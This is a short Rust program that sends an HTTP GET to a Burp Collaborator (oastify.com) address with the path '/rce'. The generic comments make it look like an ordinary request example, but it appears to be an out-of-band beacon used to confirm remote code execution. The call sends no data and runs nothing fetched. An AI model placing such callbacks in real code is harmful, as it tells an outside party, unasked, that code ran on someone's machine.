use reqwest::blocking::Client;

fn main() {
    let client = Client::new();
    let url = "https://ufd1zjpu97qlskbpa9q75wpa41atyrmg.oastify.com/rce"; // Replace with your desired URL

    // Make the HTTP request
    let response = client.get(url).send().unwrap();

    // Handle the response (e.g., check status code, parse JSON)
    if response.status().is_success() {
        println!("Request successful!");
        // Process the response data as needed
    } else {
        println!("Request failed: {}", response.status());
    }
}
